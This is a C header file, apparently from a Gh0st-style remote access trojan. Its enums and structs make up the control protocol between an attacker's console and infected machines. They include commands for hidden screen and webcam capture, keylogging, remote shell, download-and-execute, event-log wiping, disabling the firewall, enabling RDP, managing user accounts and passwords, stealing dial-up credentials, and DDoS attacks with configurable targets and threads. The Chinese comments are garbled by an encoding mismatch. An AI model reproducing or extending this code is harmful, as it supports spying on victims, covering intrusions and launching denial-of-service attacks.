
#pragma once
// BYTE���Ҳ��256
enum
{
	// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 0x00,	// һ��,������ػ���Զ���Ѿ��У�ȡ��
	TRANSFER_MODE_ADDITION,			// ׷��
	TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
	TRANSFER_MODE_OVERWRITE,		// ����
	TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
	TRANSFER_MODE_JUMP,				// ����
	TRANSFER_MODE_JUMP_ALL,			// ȫ������
	TRANSFER_MODE_CANCEL,			// ȡ������

	// ���ƶ˷���������
	COMMAND_ACTIVED = 0x00,			// ����˿��Լ��ʼ����
	COMMAND_LIST_DRIVE,				// �г�����Ŀ¼
	COMMAND_LIST_FILES,				// �г�Ŀ¼�е��ļ�
	COMMAND_DOWN_FILES,				// �����ļ�
	COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
	COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
	COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
	COMMAND_CONTINUE,				// �������������������������
	COMMAND_STOP,					// ������ֹ
	COMMAND_DELETE_FILE,			// ɾ���ļ�
	COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
	COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
	COMMAND_CREATE_FOLDER,			// �����ļ���
	COMMAND_RENAME_FILE,			// �ļ����ļ�����
	COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
	COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�

	COMMAND_SCREEN_SPY,				// ��Ļ�鿴
	COMMAND_AERO_DISABLE,			// ��������ϳ�(Aero)
	COMMAND_AERO_ENABLE,			// ��������ϳ�(Aero)
	COMMAND_SCREEN_RESET,			// �ı���Ļ���
	COMMAND_ALGORITHM_RESET,		// �ı��㷨
	COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// ��Ļ����
	COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_SCREEN_BLANK,			// ����˺���
	COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����
	COMMAND_newSCREEN_SPY,				// ����Ļ�鿴
	COMMAND_newAERO_DISABLE,			// ��������ϳ�(Aero)
	COMMAND_newAERO_ENABLE,			// ��������ϳ�(Aero)
	COMMAND_newSCREEN_RESET,			// �ı���Ļ���
	COMMAND_newALGORITHM_RESET,		// �ı��㷨
	COMMAND_newSCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_newSCREEN_CONTROL,			// ��Ļ����
	COMMAND_newSCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_newSCREEN_BLANK,			// ����˺���
	COMMAND_newSCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_newSCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_newSCREEN_SET_CLIPBOARD,	// ����Զ�̼�����

	COMMAND_WEBCAM,					// ����ͷ
	COMMAND_WEBCAM_ENABLECOMPRESS,	// ����ͷ����Ҫ�󾭹�H263ѹ��
	COMMAND_WEBCAM_DISABLECOMPRESS,	// ����ͷ����Ҫ��ԭʼ����ģʽ
	COMMAND_WEBCAM_RESIZE,			// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
	COMMAND_NEXT,					// ��һ��(���ƶ��Ѿ��򿪶Ի���)

	COMMAND_KEYBOARD,				// ���̼�¼
	COMMAND_KEYBOARD_OFFLINE,		// �������߼��̼�¼
	COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����
	COMMAND_KEYBOARD_GET,			// ��ȡ��¼

	COMMAND_AUDIO,					// ��������
	COMMAND_SPEAKER,				// ����������


	COMMAND_SYSTEM,					// ϵͳ�������̣�����....��
	COMMAND_SYSTEMINFO,				// ϵͳ��Ϣ
	COMMAND_PSLIST,					// �����б�
	COMMAND_WSLIST,					// �����б�
	COMMAND_DIALUPASS,				// ��������
	COMMAND_KILLPROCESS,			// �رս���
	COMMAND_WINDOW_CLOSE,           // �رմ���
	COMMAND_WINDOW_TEST,            // ��������
	COMMAND_KILLPROCEDELE,			// �رս��̲�ɾ���ļ�
	COMMAND_SOFTWARELIST,           // ����б�
	COMMAND_IHLIST,                 // IE�����¼
	COMMAND_FULIST,                 // IE�ղؼ�
	COMMAND_NSLIST,                 // ���������б�
	COMMAND_APPUNINSTALL,           // ж�����
	COMMAND_GETHOSTS,               // ��ȡHost�ļ�
	COMMAND_SETHOSTS,               // �޸�Host�ļ�
	COMMAND_NETCONFIG,				// ��������
	COMMAND_HARDWARE,				// Ӳ����Ϣ
	COMMAND_STARTUP,				// ������


	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// �Ự�����ػ���������ע��, ж�أ�
	COMMAND_REMOVE,					// ж�غ���
	COMMAND_DOWN_EXEC,				// �������� - ����ִ��
	COMMAND_UPDATE_SERVER,			// �������� - ���ظ���
	COMMAND_CLEAN_EVENT,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_System,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_Security,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_Application,		// �������� - ���ϵͳ��־
	COMMAND_OPEN_URL_HIDE,			// �������� - ���ش���ҳ
	COMMAND_OPEN_URL_SHOW,			// �������� - ��ʾ����ҳ
	COMMAND_RENAME_REMARK,			// ��������ע
	COMMAND_REPLAY_HEARTBEAT,		// �ظ�������
	COMMAND_CHANGE_GROUP,			// ���ķ���
	COMMAND_SHOW_MSG,               // ������Ϣ

	COMMAND_SYSINFO,                //��������Ϣ
	COMMAND_SEND_SYSINFO,			//��ȡ��������Ϣ
	COMMAND_SEND_INSTALLINFO,		//��ȡ��װ��Ϣ
	COMMAND_NET_USER,				//��net����û�
	COMMAND_GUEST,                  //����GUEST
	COMMAND_STOPFIRE,               //�رշ���ǽ
	COMMAND_CHANGE_PORT,            //�����ն˶˿�
	COMMAND_OPEN_PROXY,				//����
	COMMAND_CLOSE_3389,				//�ر�3389
	COMMAND_OPEN_3389,				//����3389
	COMMAND_DLL_3389,				//���Դ���3389dll
	COMMAND_START_MAP,				//����ӳ��
	COMMAND_CLOSE_PORT,				//�ر�ӳ��
	COMMAND_SLIST,					//��ȡϵͳ�û�
	COMMAND_DELUSER,				//ɾ���û�
	COMMAND_NET_CHANGE_PASS,		//�����û�����
	COMMAND_WTSLIST,				//�����û�
	COMMAND_WTS_Logoff,			    //ע���û�
	COMMAND_WTS_Disconnect,			//�Ͽ��û�
	COMMAND_DISABLEEUSER,
	COMMAND_ACITVEUSER,

	COMMAND_REGEDIT,                //ע������
	COMMAND_REG_FIND,               //��ѯ����  
	COMMAND_REG_DELPATH,            //ɾ����
	COMMAND_REG_CREATEPATH,         //������
	COMMAND_REG_DELKEY,             //ɾ����
	COMMAND_REG_CREATKEY,           //������
	COMMAND_SERMANAGER,				// ������� 

		COMMAND_CHAT,                   // Զ�̽�̸
		COMMAND_CHAT_CLOSE,             // ������̸

	COMMAND_DDOS_ATTACK,            // DDOS
	COMMAND_DDOS_STOP,              // STOP

	COMMAND_SORT_PROCESS,			// ɸѡ����
	COMMAND_SORT_WINDOW,			// ɸѡ����

		COMMAND_GN,    //С����
	TOKEN_INFO_YES,					// ɸѡ
	TOKEN_INFO_NO,					// ɸѡ	

	// ����˷����ı�ʶ
	TOKEN_AUTH = 130,				// Ҫ����֤
	TOKEN_HEARTBEAT,				// ������
	TOKEN_LOGIN,					// ���߰�
	TOKEN_DRIVE_LIST,				// �������б�
	TOKEN_FILE_LIST,				// �ļ��б�
	TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
	TOKEN_FILE_DATA,				// �ļ�����
	TOKEN_TRANSFER_FINISH,			// �������
	TOKEN_DELETE_FINISH,			// ɾ�����
	TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
	TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
	TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
	TOKEN_DATA_CONTINUE,			// ������������
	TOKEN_RENAME_FINISH,			// �����������
	TOKEN_EXCEPTION,				// ���������쳣


	TOKEN_SSLIST,					// �������
		TOKEN_CHAT_START,               // ��̸��ʼ

	TOKEN_BITMAPINFO,				// ��Ļ�鿴��BITMAPINFO
	TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
	TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
	TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������
		TOKEN_newBITMAPINFO,				// ��Ļ�鿴��BITMAPINFO
		TOKEN_newFIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
		TOKEN_newNEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
		TOKEN_newCLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������
	TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ��BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// ����ͷ��ͼ������

	TOKEN_AUDIO_START,				// ��ʼ��������
	TOKEN_AUDIO_DATA,				// ������������

	TOKEN_SPEAK_START,				// ��ʼ����������
	TOKEN_SPEAK_STOP,				// �ر�����������
	TOKEN_SEND_SPEAK_START,				//���ͱ���������
	TOKEN_SEND_SPEAK_STOP,				//�رշ��ͱ���������
		TOKEN_SPEAK_DATA,				// ��ʼ����������


	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_KEYBOARD_DATA,			// ���̼�¼������

	TOKEN_SYSINFOLIST,              // ��Ϣ�б�
	TOKEN_INSTALLINFOLIST,			// ��װ��Ϣ�б�
	TOKEN_ADD_SUCCESS,				// ��ӳɹ�
	TOKEN_ADD_ERROR,				// ���ʧ��
	TOKEN_DEL_SUCCESS,				// ɾ���û��ɹ�
	TOKEN_DEL_ERROR,				// ɾ���û�ʧ��
	TOKEN_CHANGE_PSAA_SUCCESS,		// �޸�����ɹ�
	TOKEN_CHANGE_PSAA_ERROR,		// �޸�����ʧ��
	TOKEN_DLL_3389,					// ����3389ʧ��
	TOKEN_SLIST,					// ö��ϵͳ�û�
	TOKEN_WTSLIST,					// ö�������û�
	TOKEN_STATE_SUCCESS,			// �����û�״̬�ɹ�
	TOKEN_STATE_ERROR,				// �����û�״̬ʧ��
		TOKEN_CSystemManager,
		TOKEN_SYSTEMINFO,				// ϵͳ��Ϣ
		TOKEN_PSLIST,					// �����б�
		TOKEN_WSLIST,					// �����б�
		TOKEN_DIALUPASS,				// ��������
		TOKEN_SHELL_START,				// Զ���ն˿�ʼ
		TOKEN_SOFTWARE,					// ����б�
		TOKEN_IHLIST,                   // IE�����¼
		TOKEN_FULIST,					// IE�ղؼ�
		TOKEN_NSLIST,					// ���������б�
		TOKEN_HOSTSINFO,				// Host�ļ�
		TOKEN_NETCONFIG,				// ��������
		TOKEN_HARDWARE,					// Ӳ����Ϣ
		TOKEN_STARTUP,					// ������
	TOKEN_REGEDIT,                  // ��ע������
	TOKEN_REG_PATH,                 // ����ע�������
	TOKEN_REG_KEY,                  // ���ͼ���
	TOKEN_REG_OK,                   // ִ�гɹ�
	TOKEN_REG_NO,                   // ִ��ʧ��

	COMMAND_DLLVERSION,				// DLL VERSION
	COMMAND_DLLERROR,				// DLL ERROR 
	COMMAND_DLLMAIN,				// DLL MAIN
	COMMAND_DLLOK,					// ���Լ���DLL

	TOKEN_DLLVERSION,				// ��ȡDLL�İ汾
	TOKEN_DLLLOADERROR,				// �������ʧ��
	TOKEN_DLLMAIN,					// DLLMAIN
	TOKEN_DLLOK,

	COMMAND_PROXY,					// proxy
	COMMAND_PROXY_CONNECT, //socket5����
	COMMAND_PROXY_CLOSE,
	COMMAND_PROXY_DATA,
	TOKEN_PROXY_START,//proxy start.
	TOKEN_PROXY_CONNECT_RESULT,
	TOKEN_PROXY_CLOSE,
	TOKEN_PROXY_DATA,
	TOKEN_PROXY_BIND_RESULT
};



//enum С����
enum
{
	DESK_TOP = 0x00,	// ����Ԥ��

















};
//��Ϣ�б�ṹ��
struct tagSystemInfo
{
	char szSystem[128];     //����ϵͳ
	char szCpuInfo[128];   //CPU��Ϣ
	char szActiveTime[128]; //�ʱ��
	char szAntiVirus[128]; //ɱ�����
	char szUserName[128];   //�û���
	char szRemotePort[128]; //Զ�̶˿�
	DWORD szMemory;         //�ڴ��С 
	DWORD szMemoryFree;     //�����ڴ� 
	DWORD szDriveSize;      //Ӳ�̴�С
	DWORD szDriveFreeSize;  //����Ӳ�̴�С
	char szOpenInfo[128];	// �Ƿ�˫��(�Ƿ���)
};

//��װ��Ϣ�б�ṹ��
struct tagOnlineInfo
{
	char szrHostA[128];		//��������A
	char szrHostB[128]; 		//��������B
	char szrInstallTime[128]; 	//��װʱ��
	char szrSerName[128];		//��װ�ķ�����
};

typedef struct
{
	BYTE			bToken;			// = 1
	//OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
	char			OsVerInfoEx[sizeof(OSVERSIONINFOEX)];// �汾��Ϣ
	int				CPUClockMhz;	// CPU��Ƶ
	char			CPUNumber[20];	// CPU����
	DWORD			MemSize;		// �ڴ��С
	IN_ADDR			IPAddress;		// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			HostName[50];	// ������
	bool			bIsWebCam;		// �Ƿ�������ͷ
	DWORD			dwSpeed;		// ����
	char			UpGroup[32];	// ���߷���
	char			szVersion[32];	// ���߰汾
	char			Virus[40];		// ɱ�����
}LOGININFO;

typedef struct MyTcpKeepAlive
{
	DWORD onoff;
	DWORD keepalivetime;
	DWORD keepaliveinterval;
}TCP_KEEP_ALIVE;

typedef struct DDOS_HEAD
{
	CHAR Target[500];    //����Ŀ��
	CHAR DNSTarget[500];    //DNS������DNS��ַ
	int AttackPort;     //�����˿�
	int AttackType;     //��������
	int AttackThread;   //�����߳�
	int AttackTime;     //����ʱ��
	int ExtendData1;   //��������
	int ExtendData2;   //��������
	CHAR DDOSType[500];    //��������
}DATTACK, * LPATTACK;


typedef struct
{
	BYTE bToken;		   // = 1
	CHAR szCpuSpeend[32];  //CPU�ٶ�
	CHAR szCpuInfo[128];   //CPU��Ϣ
	CHAR szPcName[50];     //���������
	CHAR szUserName[32];   //�û���
	CHAR szActiveTime[96]; //�ʱ��
	CHAR szScrSize[32];    //��Ļ�ֱ���
	CHAR LineName[100];    //��������
	CHAR LinePort[32];     //���߶˿�
	CHAR Program[256];     //����;��
	CHAR InstallOpen[100]; //�������з�ʽ
	CHAR szUserVirus[256]; //�û�ɱ�����
	CHAR szQQNum[256];     //��ǰ���е�QQ����
	DWORD Memory;          //�ڴ�����
}MESSAGEInfo;
#define	MAX_WRITE_RETRY			15 // ����д���ļ�����
#define MAX_SEND_BUFFER		2048*300	// ��������ݳ���(�ٶȿɴﵽ50Mbps)
#define	MAX_RECV_BUFFER		(MAX_SEND_BUFFER-31) // ���������ݳ���(�ٶȿɴﵽ50Mbps)

